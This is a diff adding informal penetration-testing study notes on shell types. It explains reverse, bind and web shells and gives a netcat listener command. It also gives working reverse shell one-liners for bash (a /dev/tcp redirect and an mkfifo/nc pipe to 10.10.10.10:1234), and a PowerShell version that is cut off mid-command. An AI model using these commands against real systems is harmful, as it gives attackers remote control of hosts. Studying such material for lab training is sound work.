@@ -377,4 +377,37 @@ set RHOSTS STMIP
 set RPORT STMPO
 set FILEPATH /flag.txt
 exploit
-update
+\\\\Type of shells
+once compromise a system and exploit a vul to execution command on compromise host remote we usually need a method of comm with the system not to have to keep exploiting the same vul to execute each command
+-to enumerates the system or take further control over it or within its network -> we need a reliable conn that gives direct access to the system sheell
+Bash or Powershell 
+-one way to conn to a compromise system is through network protocols like SSH for linux or WinRM for windows, which would allow us a remote login t the compromise
+system hower unless we obtain a working set of login credentials, we would not be able to utilize these methods without executing commands on the remote system first.
+-other method of accessing a compr host for control and remote code execute is through shells as previously discussed 
++Reverse shelll +Bind shell + Web shell . each of these shells has a different method of comm with us for accepting and executing our command
+type of sheel 						Method of comm
+Reverse shell 						Connect back to our system and gives us control through a reverse conn
+Bind Shell 							Waits for us to connect to it and give control once we do
+Web shell 								Comm through a web server, accepts our command through HTTP parameters, execute them and prints back the output
+\\Reverse Sheel
+most common type of shell, as it is the quickest and easiest method to obtain control over a compromissed host. once we identify a vul on the remote host that allows remote code execute.
+we can start a netcat listener on our machine that lstens on a specific port,  say port 1234. with this listener in place, we can execute a reverse shell command that connect
+the remote system shell ie Bash or PowerShell to our netcat listener, which gives a reverse conn over the remote system
+\\netcat listener
+$nc -lvnp 1234	
+Flag			Description
+-l				Listen mode, to wait for a conn to connect to us
+-v 			Verbose mode, so that we know whe we receive a conn
+-n 			Disable DNS resolution and only connect from/to IPs, to speed up the conn
+-p 1234		Port number netcat is listening on, and the reverse conn should be sent to
+\\Connect back IP
+$ip a  -> check for network interface
+\\Reverse Shell command
+depend on what OS we atk what app and commands we can access
+$reverse shell cheat sheet : https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/
+certain reverse shell commands are mote reliable than others and can usually be attempted to get a reverse conn.
+EX: get a reverse conn for bash on Linux compromised hosts and Powershell on windows compromised hosts
+$bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
+$rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
+-Powershell
+$powershell -nop -c "$client = New -O
